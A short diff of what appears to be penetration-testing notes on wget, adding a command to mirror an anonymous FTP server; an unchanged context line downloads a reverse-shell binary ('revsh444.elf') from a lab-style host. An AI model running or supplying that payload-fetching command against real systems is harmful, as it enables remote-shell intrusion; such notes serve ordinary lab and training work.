@@ -1,6 +1,8 @@
 
 `wget 10.18.21.236/shells/revsh444.elf`
 
+mirror a ftp site
+`wget -m --no-passive ftp://anonymous:anonymous@10.10.32.52`
 ### Help
 
 ```sh
